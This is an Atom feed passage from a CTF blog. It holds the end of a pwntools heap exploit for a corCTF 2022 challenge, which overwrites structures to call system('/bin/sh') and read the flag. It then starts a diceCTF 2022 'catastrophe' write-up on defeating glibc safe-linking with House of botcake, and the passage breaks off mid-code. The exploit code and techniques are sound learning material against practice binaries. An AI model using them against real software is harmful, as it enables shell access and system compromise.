    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">firstname</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">midname</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">lastname</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bio</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">36</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;//bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="o">+</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="o">+</span><span class="mi">2</span><span class="p">):</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Y&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Y&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1 Add</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x1c7cc0</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">decrypt_pointer</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1 Add</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x1000</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xbe02f0</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2730</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mh">0x404010</span><span class="p">)))</span>

<span class="c1"># dumb</span>
<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="c1">#===</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter size (1032 minimum): </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1032</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xbbdf80</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x71ab0</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input bio: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4cb40</span><span class="p">))</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag: </span><span class="si">{</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/corCTF" term="corCTF" label="corCTF" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[diceCTF 2022 - pwn] catastrophe]]></title>
            <link href="https://nasm.re/posts/catastrophe/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/catastrophe/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-07-28T00:00:00+00:00</published>
            <updated>2022-07-28T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<blockquote>
<p>I just learned how to use malloc and free&hellip; am I doing this right?</p>
</blockquote>
<p>catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic linker, thus I did a first time the challenge with the libc that was in <code>/lib/libc.so.6</code>, then I figured out thanks to my teammate <a
  class="gblog-markdown__link"
  href="../../tags/supersnail"
  
  >supersnail</a
> that I was using the wrong libc. Then I did it again with the right libc but the dynamic linker was (again) wrong and I lost a loot of time on it. So well, the challenge wasn&rsquo;t pretty hard but I took a funny way to solve it because I thought the libc had <code>FULL RELRO</code> while  it had only <code>PARTIAL RELRO</code>. Find the exploit and the tasks <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2022/diceCTF/pwn/catastrophe"
  
  >right here</a
>.</p>



  <div class="gblog-toc gblog-toc__level--5">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#tl-dr">TL; DR</a></li>
    <li><a href="#what-we-have">What we have</a></li>
    <li><a href="#defeat-safe-linking">Defeat safe-linking</a></li>
    <li><a href="#house-of-botcake">House of botcake</a></li>
    <li><a href="#getting-arbitrary-write">Getting arbitrary write</a></li>
    <li><a href="#fsop-on-stdout-to-leak-environ">FSOP on stdout to leak environ</a></li>
    <li><a href="#ropchain">ROPchain</a></li>
    <li><a href="#resources">Resources</a></li>
    <li><a href="#appendices">Appendices</a></li>
  </ul>
</nav>
    <hr />
  </div>


<div class="gblog-post__anchorwrap">
    <h1 id="tl-dr">
        TL; DR
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#tl-dr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL; DR" href="#tl-dr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<ul>
<li>Leak heap address + defeating safe linking by printing the first free&rsquo;d chunk in the tcache.</li>
<li><a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> to create overlapping chunks and get arbitrary write</li>
<li>FSOP on stdout to leak <code>environ</code> and then ROP over the stack.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h1 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>catastrophe is a classic heap challenge here are the classic informations about it:</p>
<pre tabindex="0"><code>$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
$ checksec --file libc.so.6 
[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ checksec --file catastrophe 
[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/catastrophe'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p><code>2.35</code> libc, which means there is no more classic hooks like <code>__malloc_hook</code> or <code>__free_hook</code>. The binary allows to:</p>
<ul>
<li>malloc up to 0x200 bytes and read data in it with the use of <code>fgets</code></li>
<li>Allocate from the index 0 to 9</li>
<li>free anything given the index is between 0 and 9</li>
</ul>
<p>Thus we can easily do a <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> but first of all we have to defeat the safe linking to properly getting an arbitrary write.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="defeat-safe-linking">
        Defeat safe-linking
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#defeat-safe-linking" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Defeat safe-linking" href="#defeat-safe-linking">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Since <code>2.32</code> is introduced in the libc the safe-linking mechanism that does some xor encyptions on <code>tcache</code>, <code>fastbin</code> next fp to prevent pointer hiijacking. Here is the core of the mechanism:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
</span><span class="c1"></span><span class="cm">/* Safe-Linking:
</span><span class="cm">   Use randomness from ASLR (mmap_base) to protect single-linked lists
</span><span class="cm">   of Fast-Bins and TCache.  That is, mask the &#34;next&#34; pointers of the
</span><span class="cm">   lists&#39; chunks, and also perform allocation alignment checks on them.
</span><span class="cm">   This mechanism reduces the risk of pointer hijacking, as was done with
</span><span class="cm">   Safe-Unlinking in the double-linked lists of Small-Bins.
</span><span class="cm">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
</span><span class="cm">   larger pages provide less entropy, although the pointer mangling
</span><span class="cm">   still works.  */</span>
<span class="cp">#define PROTECT_PTR(pos, ptr) \
</span><span class="cp">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
</span><span class="cp">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
</span></code></pre></div><p>Since for this challenge we&rsquo;re focused on <code>tcache</code>, here is how a chunk is free&rsquo;d using safe-linking:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175
</span><span class="c1"></span><span class="cm">/* Caller must ensure that we know tc_idx is valid and there&#39;s room
</span><span class="cm">   for more chunks.  */</span>
<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>

  <span class="cm">/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
</span><span class="cm">     detect a double free.  */</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache_key</span><span class="p">;</span>

  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">PROTECT_PTR</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div><p>Thus, the first time a chunk is inserted into a tcache list, <code>e-&gt;next</code> is initialized to <code>&amp;e-&gt;next &gt;&gt; 12</code> (heap base address) xor <code>tcache-&gt;entries[tc_idx]</code> which is equal to zero when the list for a given size is empty.</p>
<p>Which means to leak the heap address we simply have to print a free&rsquo;d chunk once it has been inserted in the tcache.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="house-of-botcake">
        House of botcake
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#house-of-botcake" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor House of botcake" href="#house-of-botcake">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>The <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> gives a write what where primitive by poisoning the tcache. The algorithm is:</p>
<ul>
<li>Allocate 7 <code>0x100</code> sized chunks to then fill the tcache (7 entries).</li>
<li>Allocate two more <code>0x100</code> sized chunks (<code>prev</code> and <code>a</code> in the example).</li>
<li>Allocate a small &ldquo;barrier&rdquo; <code>0x10</code> sized chunk.</li>
<li>Fill the tcache by freeing the first 7 chunks.</li>
<li>free(a), thus <code>a</code> falls into the unsortedbin.</li>
<li>free(prev), thus <code>prev</code> is consolidated with <code>a</code> to create a large <code>0x221</code> sized chunk that is yet in the unsortedbin.</li>
<li>Request one more <code>0x100</code> sized chunk to let a single entry left in the tcache.</li>
<li>free(a) again, given <code>a</code> is part of the large <code>0x221</code> sized chunk it leads to an UAF. Thus <code>a</code> falls into the tcache.</li>
<li>That&rsquo;s finished, to get a write what where we just need to request a <code>0x130</code> sized chunk. Thus we can hiijack the next fp of <code>a</code> that is currently referenced by the tcache by the location we wanna write to. And next time two <code>0x100</code> sized chunks are requested, the second one will be the target location.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h1 id="getting-arbitrary-write">
        Getting arbitrary write
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#getting-arbitrary-write" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Getting arbitrary write" href="#getting-arbitrary-write">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>To make use of the write what were we got thanks to the <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
>, we need to get both heap and libc leak. To leak libc that&rsquo;s pretty easily we just need to print out a free&rsquo;d chunk stored into the unsortedbin, it&rsquo;s forward pointer is not encrypted with safe-linking.</p>
<p>As seen previously, to bypass safe-linking we have to print a free&rsquo;d chunk once it has been inserted in the tcache. It would give us the base address of the heap. When we got it, we just have to initialize the location we wanna write to <code>location ^ ((heap_base + chunk_offset) &gt;&gt; 12)</code> to encrypt properly the pointer, this way the primitive is efficient.</p>
<p>Implmentation of the <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> + safe-linking bypass, heap and libc leak:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;-</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index?</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span> 
